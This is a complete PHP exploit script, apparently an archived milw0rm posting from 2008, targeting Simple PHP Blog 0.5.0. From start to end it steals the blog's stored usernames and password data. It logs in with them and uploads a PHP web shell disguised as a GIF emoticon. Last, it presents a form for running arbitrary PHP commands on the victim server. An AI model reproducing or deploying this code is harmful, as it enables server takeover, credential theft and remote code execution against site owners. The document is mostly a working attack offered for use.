<?
/*
   sIMPLE php bLOG 0.5.0 eXPLOIT
   bY mAXzA 2008
*/
function curl($url,$postvar){
  global $cook;
  $ch = curl_init( $url );
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_HEADER, 1);
  curl_setopt ($ch, CURLOPT_REFERER,"$url");
  if (strlen($postvar)<3) $postvar="123";
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $postvar);
  if (strlen($cook)>3)
      curl_setopt ($ch, CURLOPT_COOKIE, "$cook");
  $res = curl_exec ($ch);$err=curl_error ( $ch );if ($err) print "<hr>$err<hr>";
  curl_close($ch);
  return $res;
}

function error($msg){
  print "<hr>$msg<hr>\n<h1>Not Exploitable";exit;
}

extract($_POST);extract($_GET);

print "<pre>URL:<form method=post><input size=80 name=url value=`$url`>";
if (strlen($eval)>3){
   $eval=stripslashes($eval);
   print "\nEnter PHP Command:\n<textarea name=eval rows=10 cols=90>$eval</textarea>";
   print "<input type=submit value='Eval'></form>";
   $res=curl("$url/images/emoticons/sphp.php","z=$eval");
   $res=strstr($res,"GIF89a");
   print substr($res,41);exit;
}

if (strlen($url)>10)
{
  print "\n<hr>Trying to Get /config/users.php...";flush();
  $res=curl($url."/config/users.php","");
  if (strstr($res,'|')) print "Done!\n\n$res";
  else error("\n\nUsername & Password Not Found\n\n$res");

  print "\n<hr>Trying to Get Username & Password...";flush();
  $res=str_replace("\r\n","\n",$res);
  $res=substr($res,strpos($res,"\n\n")+2);
  $line=explode("\n",$res);$n=count($line)-1;
  if ($n) {
  print "\nDone! Found - $n users:\n";
   for ($x=0;$x<$n;$x++){
     $up=explode("|",$line[$x]);$user[$x]=$up[1];$pass[$x]=substr($up[2],0,2);
     print "\nUsername - ".$up[1]."\tPassword - ".$up[2];
   }
  }

  print "\n<hr>Trying to Login...";flush();
  $postvar="user=$user[0]&pass=$pass[0]&";
  $res=curl($url."/login_cgi.php","$postvar");
  $cook=strstr($res,'Set-Cookie: sid=');
  $cook=substr($cook,12,strpos($cook,';')-12);
  if ($cook) print "\n\nDone...  Cookie - $cook";else error("\n<h1>Error To Login</h1>\n\n\n$res");

  print "\n<hr>Trying to Upload Emoticon...";flush();
  $buf="R0lGODlhAQABAIAAAP///wAAACH5BAEUAAAALAAAAAABAAEAAAICRAE8PyBldmFsKHN0cmlwc2xhc2hlcygkX1BPU1Rbel0pKTtleGl0Oz8+Ow==";
  if (@filesize('sphp.php')!=82){
       $f=fopen('sphp.php',"w");fwrite($f,base64_decode($buf));fclose($f);
  }
  $f=getcwd()."/sphp.php";
  $res=curl($url."/emoticons.php",array('user_emot'=>"@$f"));
  if (strstr($res,"Success!")) print "\n\nDone! Exploit path - $url/images/emoticons/sphp.php"; else error("\n<h1>Error To Upload</h1>\n\n\n$res");

  print "\n<hr>Trying to Exploit...";flush();
  $res=curl($url."/images/emoticons/sphp.php","z=print 20080824;");
  if (strstr($res,"20080824")) print "\n\nDone! Exploit Working!"; else error("\n<h1>Error To Exploit</h1>\n\n\n$res");

  print "\n<hr>Trying to Logout...";flush();
  $res=curl($url."/logout.php","");
  if (strstr($res,"You are now logged out")) print "\n\nDone!"; else error("\n<h1>Error To Logout</h1>\n\n\n$res");
  print "\nEnter PHP Command:\n<textarea name=eval rows=10 cols=90></textarea>";
}
print "<input type=submit ></form>";
?>

# milw0rm.com [2008-08-26]